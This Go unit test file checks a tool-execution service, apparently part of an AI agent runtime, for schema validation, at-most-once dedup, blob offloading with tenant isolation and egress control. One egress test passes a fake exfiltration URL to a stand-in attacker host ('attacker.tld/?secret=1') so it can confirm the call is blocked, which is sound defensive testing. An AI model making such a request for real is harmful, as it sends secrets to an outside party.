// Package execute tests — the ExecuteTool use-case (T-TR-07).
//
// These are pure unit tests against the truntimetest fakes and the in-memory
// blob fake: no Docker, no Postgres, no network. They assert the use-case:
//
//   - validates+dispatches and returns a terminal result (happy path);
//   - a schema violation returns an error result (not a panic), and the tool's
//     Execute is never invoked;
//   - a Mutating tool whose dedup key is already completed returns the prior
//     result without re-executing (at-most-once, FR-TOOL-04);
//   - an External-class tool denied by the egress broker is blocked before
//     execution (FR-TOOL-06);
//   - large output is offloaded to the blob store with Truncated=true and a
//     populated BlobRef (FR-STATE-05);
//   - completion is recorded in the dedup ledger.
package execute

import (
	"context"
	"encoding/json"
	"errors"
	"strings"
	"testing"

	"github.com/boltrope/boltrope/internal/platform/blob"
	"github.com/boltrope/boltrope/internal/platform/blob/blobtest"
	"github.com/boltrope/boltrope/internal/toolruntime/adapter/registry"
	"github.com/boltrope/boltrope/internal/toolruntime/app"
	"github.com/boltrope/boltrope/internal/toolruntime/app/truntimetest"
	"github.com/boltrope/boltrope/internal/toolruntime/domain"
)

// objectSchema is a permissive object schema accepting a single string field.
var objectSchema = json.RawMessage(`{
	"type": "object",
	"required": ["x"],
	"properties": {"x": {"type": "string"}},
	"additionalProperties": false
}`)

// recordingEmitter captures the progress events the service emits.
type recordingEmitter struct {
	events []Progress
	err    error // when non-nil, Progress returns it (to test emit failures)
}

func (e *recordingEmitter) Progress(_ context.Context, p Progress) error {
	e.events = append(e.events, p)
	return e.err
}

// fixture bundles the injected fakes and the service under test.
type fixture struct {
	reg     *registry.Registry
	runtime *truntimetest.FakeRuntimePort
	egress  *truntimetest.FakeEgressBroker
	dedup   *truntimetest.FakeDedupStore
	blobs   *blobtest.FakeBlobStore
	svc     *Service
}

// newFixture builds a service wired to fresh fakes. Register tools onto
// f.reg before calling Execute.
func newFixture(t *testing.T) *fixture {
	t.Helper()
	f := &fixture{
		reg:     registry.New(nil),
		runtime: truntimetest.NewFakeRuntimePort(),
		egress:  truntimetest.NewFakeEgressBroker(),
		dedup:   truntimetest.NewFakeDedupStore(),
		blobs:   blobtest.NewFakeBlobStore(),
	}
	svc, err := NewService(Config{
		Registry: f.reg,
		Runtime:  f.runtime,
		Egress:   f.egress,
		Dedup:    f.dedup,
		Blobs:    f.blobs,
	})
	if err != nil {
		t.Fatalf("NewService: %v", err)
	}
	f.svc = svc
	return f
}

func mustRegister(t *testing.T, reg *registry.Registry, tool domain.Tool) {
	t.Helper()
	if err := reg.Register(context.Background(), tool); err != nil {
		t.Fatalf("Register(%s): %v", tool.Spec().Name, err)
	}
}

// TestExecute_ValidatesDispatchesReturnsTerminal asserts the happy path: a
// valid call dispatches to the tool and a terminal result is returned, and the
// dedup ledger records completion.
func TestExecute_ValidatesDispatchesReturnsTerminal(t *testing.T) {
	f := newFixture(t)
	tool := truntimetest.NewFakeTool(domain.ToolSpec{
		Name:        "read",
		Description: "reads",
		JSONSchema:  objectSchema,
		SideEffect:  domain.SideEffectReadOnly,
		EgressClass: domain.EgressClassNone,
	})
	tool.AddObservation(domain.Observation{Content: "file contents"}, nil)
	mustRegister(t, f.reg, tool)

	em := &recordingEmitter{}
	res, err := f.svc.Execute(context.Background(), Request{
		TenantID:       "tenantA",
		SessionID:      "sess1",
		CallID:         "call1",
		ToolName:       "read",
		Args:           map[string]any{"x": "hello"},
		IdempotencyKey: "key1",
	}, em)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if res.Observation.IsError {
		t.Fatalf("unexpected error observation: %+v", res.Observation)
	}
	if res.Observation.Content != "file contents" {
		t.Errorf("Content = %q, want %q", res.Observation.Content, "file contents")
	}
	if len(tool.ExecCalls) != 1 {
		t.Fatalf("tool Execute called %d times, want 1", len(tool.ExecCalls))
	}
	if tool.ExecCalls[0].SessionID != "sess1" {
		t.Errorf("Execute sessionID = %q, want sess1", tool.ExecCalls[0].SessionID)
	}

	// Dedup ledger records completion with the result.
	rec, lookupErr := f.dedup.Lookup(context.Background(), "tenantA", "sess1", "key1")
	if lookupErr != nil {
		t.Fatalf("dedup Lookup: %v", lookupErr)
	}
	if rec.Status != app.ExecCompleted {
		t.Errorf("dedup status = %q, want completed", rec.Status)
	}
	if rec.Result.Content != "file contents" {
		t.Errorf("dedup result content = %q", rec.Result.Content)
	}
}

// TestExecute_SchemaViolationReturnsErrorResult asserts a schema violation is
// surfaced as an error result (is_error=true), the tool's Execute is never
// invoked, and nothing panics (FR-TOOL-01).
func TestExecute_SchemaViolationReturnsErrorResult(t *testing.T) {
	f := newFixture(t)
	tool := truntimetest.NewFakeTool(domain.ToolSpec{
		Name:        "read",
		Description: "reads",
		JSONSchema:  objectSchema,
		SideEffect:  domain.SideEffectReadOnly,
		EgressClass: domain.EgressClassNone,
	})
	mustRegister(t, f.reg, tool)

	em := &recordingEmitter{}
	res, err := f.svc.Execute(context.Background(), Request{
		TenantID:       "tenantA",
		SessionID:      "sess1",
		CallID:         "call1",
		ToolName:       "read",
		Args:           map[string]any{"wrong": "field"}, // missing required "x", extra field
		IdempotencyKey: "key1",
	}, em)
	if err != nil {
		t.Fatalf("Execute returned a Go error, want error-as-observation: %v", err)
	}
	if !res.Observation.IsError {
		t.Fatalf("expected error observation, got %+v", res.Observation)
	}
	if len(tool.ExecCalls) != 0 {
		t.Errorf("tool Execute was called %d times on invalid input, want 0", len(tool.ExecCalls))
	}
}

// TestExecute_MutatingDedupHitReturnsPriorResult asserts a Mutating tool whose
// dedup key is already marked completed returns the prior result without
// re-executing the tool (at-most-once, FR-TOOL-04 AC-1).
func TestExecute_MutatingDedupHitReturnsPriorResult(t *testing.T) {
	f := newFixture(t)
	tool := truntimetest.NewFakeTool(domain.ToolSpec{
		Name:        "write",
		Description: "writes",
		JSONSchema:  objectSchema,
		SideEffect:  domain.SideEffectMutating,
		EgressClass: domain.EgressClassNone,
	})
	// Script an observation that must NOT be returned (the prior result wins).
	tool.AddObservation(domain.Observation{Content: "freshly executed"}, nil)
	mustRegister(t, f.reg, tool)

	// Pre-seed the ledger with a completed record (simulating a prior run /
	// a restart with a durable completed entry).
	if err := f.dedup.Complete(context.Background(), app.ExecutionRecord{
		TenantID:       "tenantA",
		SessionID:      "sess1",
		IdempotencyKey: "key1",
		Status:         app.ExecCompleted,
		Result:         domain.Observation{Content: "prior result"},
	}); err != nil {
		t.Fatalf("seed dedup: %v", err)
	}

	res, err := f.svc.Execute(context.Background(), Request{
		TenantID:       "tenantA",
		SessionID:      "sess1",
		CallID:         "call1",
		ToolName:       "write",
		Args:           map[string]any{"x": "data"},
		IdempotencyKey: "key1",
	}, &recordingEmitter{})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if res.Observation.Content != "prior result" {
		t.Errorf("Content = %q, want prior result (dedup hit)", res.Observation.Content)
	}
	if len(tool.ExecCalls) != 0 {
		t.Errorf("tool Execute called %d times on dedup hit, want 0 (at-most-once)", len(tool.ExecCalls))
	}
}

// TestExecute_ExternalToolDeniedByEgress asserts an External-class tool whose
// session has no egress allowance is blocked before execution: the result is an
// error observation and the tool's Execute is never invoked (FR-TOOL-06).
func TestExecute_ExternalToolDeniedByEgress(t *testing.T) {
	f := newFixture(t)
	tool := truntimetest.NewFakeTool(domain.ToolSpec{
		Name:        "webfetch",
		Description: "fetches",
		JSONSchema: json.RawMessage(`{
			"type": "object",
			"required": ["url"],
			"properties": {"url": {"type": "string"}},
			"additionalProperties": false
		}`),
		SideEffect:  domain.SideEffectMutating,
		EgressClass: domain.EgressClassExternal,
	})
	tool.AddObservation(domain.Observation{Content: "should not run"}, nil)
	mustRegister(t, f.reg, tool)

	// No egress policy set for the session → deny-by-default.
	res, err := f.svc.Execute(context.Background(), Request{
		TenantID:       "tenantA",
		SessionID:      "sess1",
		CallID:         "call1",
		ToolName:       "webfetch",
		Args:           map[string]any{"url": "https://attacker.tld/?secret=1"},
		IdempotencyKey: "key1",
	}, &recordingEmitter{})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if !res.Observation.IsError {
		t.Fatalf("expected egress-denied error observation, got %+v", res.Observation)
	}
	if !strings.Contains(strings.ToLower(res.Observation.Content), "egress") {
		t.Errorf("error content = %q, want it to mention egress", res.Observation.Content)
	}
	if len(tool.ExecCalls) != 0 {
		t.Errorf("tool Execute called %d times despite egress denial, want 0", len(tool.ExecCalls))
	}
}

// TestExecute_ExternalToolAllowedByEgress asserts an External-class tool whose
// host is on the session allowlist proceeds to execute.
func TestExecute_ExternalToolAllowedByEgress(t *testing.T) {
	f := newFixture(t)
	tool := truntimetest.NewFakeTool(domain.ToolSpec{
		Name:        "webfetch",
		Description: "fetches",
		JSONSchema: json.RawMessage(`{
			"type": "object",
			"required": ["url"],
			"properties": {"url": {"type": "string"}},
			"additionalProperties": false
		}`),
		SideEffect:  domain.SideEffectMutating,
		EgressClass: domain.EgressClassExternal,
	})
	tool.AddObservation(domain.Observation{Content: "<html/>"}, nil)
	mustRegister(t, f.reg, tool)

	if err := f.egress.SetPolicy(context.Background(), app.EgressPolicy{
		SessionID:    "sess1",
		AllowedHosts: []string{"good.example.com"},
	}); err != nil {
		t.Fatalf("SetPolicy: %v", err)
	}

	res, err := f.svc.Execute(context.Background(), Request{
		TenantID:       "tenantA",
		SessionID:      "sess1",
		CallID:         "call1",
		ToolName:       "webfetch",
		Args:           map[string]any{"url": "https://good.example.com/page"},
		IdempotencyKey: "key1",
	}, &recordingEmitter{})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if res.Observation.IsError {
		t.Fatalf("unexpected error observation: %+v", res.Observation)
	}
	if len(tool.ExecCalls) != 1 {
		t.Errorf("tool Execute called %d times, want 1", len(tool.ExecCalls))
	}
}

// TestExecute_LargeOutputOffloadedToBlob asserts output exceeding the inline
// threshold is offloaded to the blob store with Truncated=true and a populated
// BlobRef, and the full bytes are retrievable under the caller's tenant
// (FR-STATE-05).
func TestExecute_LargeOutputOffloadedToBlob(t *testing.T) {
	f := newFixture(t)
	big := strings.Repeat("A", BlobThresholdBytes+1024)
	tool := truntimetest.NewFakeTool(domain.ToolSpec{
		Name:        "bash",
		Description: "runs",
		JSONSchema:  objectSchema,
		SideEffect:  domain.SideEffectMutating,
		EgressClass: domain.EgressClassNone,
	})
	tool.AddObservation(domain.Observation{Content: big}, nil)
	mustRegister(t, f.reg, tool)

	res, err := f.svc.Execute(context.Background(), Request{
		TenantID:       "tenantA",
		SessionID:      "sess1",
		CallID:         "call1",
		ToolName:       "bash",
		Args:           map[string]any{"x": "y"},
		IdempotencyKey: "key1",
	}, &recordingEmitter{})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if !res.Observation.Truncated {
		t.Errorf("Truncated = false, want true for oversized output")
	}
	if res.Observation.BlobRef == "" {
		t.Fatalf("BlobRef is empty, want a populated ref for offloaded output")
	}
	if len(res.Observation.Content) >= len(big) {
		t.Errorf("inline Content length = %d, want a truncated stand-in shorter than %d", len(res.Observation.Content), len(big))
	}
	// The full bytes are retrievable under the caller's tenant.
	obj, rc, getErr := f.blobs.Get(context.Background(), blob.Ref{TenantID: "tenantA", Key: res.Observation.BlobRef})
	if getErr != nil {
		t.Fatalf("blob Get: %v", getErr)
	}
	defer func() { _ = rc.Close() }()
	if obj.SizeBytes != int64(len(big)) {
		t.Errorf("blob SizeBytes = %d, want %d", obj.SizeBytes, len(big))
	}
	// And it is NOT addressable from a different tenant (tenant-scoped identity).
	if _, _, xErr := f.blobs.Get(context.Background(), blob.Ref{TenantID: "tenantB", Key: res.Observation.BlobRef}); !errors.Is(xErr, blob.ErrNotFound) {
		t.Errorf("cross-tenant blob Get err = %v, want ErrNotFound", xErr)
	}
}

// TestExecute_ToolNotFound asserts an unknown tool yields an error result, not a
// Go error or panic.
func TestExecute_ToolNotFound(t *testing.T) {
	f := newFixture(t)
	res, err := f.svc.Execute(context.Background(), Request{
		TenantID:       "tenantA",
		SessionID:      "sess1",
		CallID:         "call1",
		ToolName:       "nope",
		Args:           map[string]any{},
		IdempotencyKey: "key1",
	}, &recordingEmitter{})
	if err != nil {
		t.Fatalf("Execute returned a Go error, want error-as-observation: %v", err)
	}
	if !res.Observation.IsError {
		t.Errorf("expected error observation for unknown tool, got %+v", res.Observation)
	}
}

// TestExecute_RunErrorRecordedFailed asserts that when the tool returns a Go
// execution error, the service surfaces an error observation and records the
// ledger entry as failed (not completed).
func TestExecute_RunErrorRecordedFailed(t *testing.T) {
	f := newFixture(t)
	tool := truntimetest.NewFakeTool(domain.ToolSpec{
		Name:        "bash",
		Description: "runs",
		JSONSchema:  objectSchema,
		SideEffect:  domain.SideEffectMutating,
		EgressClass: domain.EgressClassNone,
	})
	tool.AddObservation(domain.Observation{}, errors.New("boom"))
	mustRegister(t, f.reg, tool)

	res, err := f.svc.Execute(context.Background(), Request{
		TenantID:       "tenantA",
		SessionID:      "sess1",
		CallID:         "call1",
		ToolName:       "bash",
		Args:           map[string]any{"x": "y"},
		IdempotencyKey: "key1",
	}, &recordingEmitter{})
	if err != nil {
		t.Fatalf("Execute returned a Go error, want error-as-observation: %v", err)
	}
	if !res.Observation.IsError {
		t.Errorf("expected error observation, got %+v", res.Observation)
	}
	rec, lookupErr := f.dedup.Lookup(context.Background(), "tenantA", "sess1", "key1")
	if lookupErr != nil {
		t.Fatalf("dedup Lookup: %v", lookupErr)
	}
	if rec.Status != app.ExecFailed {
		t.Errorf("dedup status = %q, want failed", rec.Status)
	}
}

// TestNewService_RequiresCollaborators asserts the constructor rejects missing
// required collaborators.
func TestNewService_RequiresCollaborators(t *testing.T) {
	cases := map[string]Config{
		"no registry": {Runtime: truntimetest.NewFakeRuntimePort(), Egress: truntimetest.NewFakeEgressBroker(), Dedup: truntimetest.NewFakeDedupStore(), Blobs: blobtest.NewFakeBlobStore()},
		"no runtime":  {Registry: registry.New(nil), Egress: truntimetest.NewFakeEgressBroker(), Dedup: truntimetest.NewFakeDedupStore(), Blobs: blobtest.NewFakeBlobStore()},
		"no egress":   {Registry: registry.New(nil), Runtime: truntimetest.NewFakeRuntimePort(), Dedup: truntimetest.NewFakeDedupStore(), Blobs: blobtest.NewFakeBlobStore()},
		"no dedup":    {Registry: registry.New(nil), Runtime: truntimetest.NewFakeRuntimePort(), Egress: truntimetest.NewFakeEgressBroker(), Blobs: blobtest.NewFakeBlobStore()},
		"no blobs":    {Registry: registry.New(nil), Runtime: truntimetest.NewFakeRuntimePort(), Egress: truntimetest.NewFakeEgressBroker(), Dedup: truntimetest.NewFakeDedupStore()},
	}
	for name, cfg := range cases {
		t.Run(name, func(t *testing.T) {
			if _, err := NewService(cfg); err == nil {
				t.Errorf("NewService(%s) = nil error, want non-nil", name)
			}
		})
	}
}
